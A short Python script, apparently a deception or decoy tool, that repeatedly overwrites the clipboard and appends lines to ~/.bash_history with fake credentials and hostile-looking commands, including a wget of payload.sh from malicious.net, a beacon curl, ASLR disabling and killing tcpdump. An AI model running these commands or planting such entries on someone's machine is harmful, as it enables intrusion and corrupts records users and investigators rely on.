import random
import time
import os
import pyperclip
from datetime import datetime

FAKE_CLIPBOARD_ENTRIES = [
    "ssh-rsa AAAAB3Nza... user@laptop",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "aws_access_key_id=AKIAIOSFODNN7EXAMPLE",
    "0x82e3F09E3bA6A5d67f123Fa0000a2345bD91eFe8",
    "curl -X POST https://example.com/api/data",
    "nmap -sV -Pn 192.168.1.1/24",
    "token=abc123-def456-ghi789",
    "password=Winter2025!",
    "scp malware_toolkit_v5.zip user@192.168.0.100:/tmp",
    "echo YW55IGNhcm5hbCBwbGVhcw== | base64 -d"
]

FAKE_BASH_HISTORY = [
    "cd /tmp && wget http://malicious.net/payload.sh",
    "python3 ./exploit-CVE-2025-XXXX.py",
    "ls -al /etc/ssh/",
    "grep 'password' ~/.bash_history",
    "sudo nano /etc/crontab",
    "tar -czvf secrets.tar.gz ~/Documents/",
    "curl http://192.168.1.9/beacon",
    "echo 0 > /proc/sys/kernel/randomize_va_space",
    "killall tcpdump",
    "sudo su -"
]

def inject_clipboard():
    entry = random.choice(FAKE_CLIPBOARD_ENTRIES)
    pyperclip.copy(entry)
    print(f"[{datetime.now()}] Injected clipboard: {entry}")

def inject_bash_history():
    entry = random.choice(FAKE_BASH_HISTORY)
    hist_file = os.path.expanduser("~/.bash_history")
    with open(hist_file, "a") as f:
        f.write(f"\n{entry}")
    print(f"[{datetime.now()}] Appended to bash_history: {entry}")

def main():
    print("[+] Injector module started")
    while True:
        inject_clipboard()
        inject_bash_history()
        time.sleep(random.randint(30, 90))

if __name__ == '__main__':
    main()

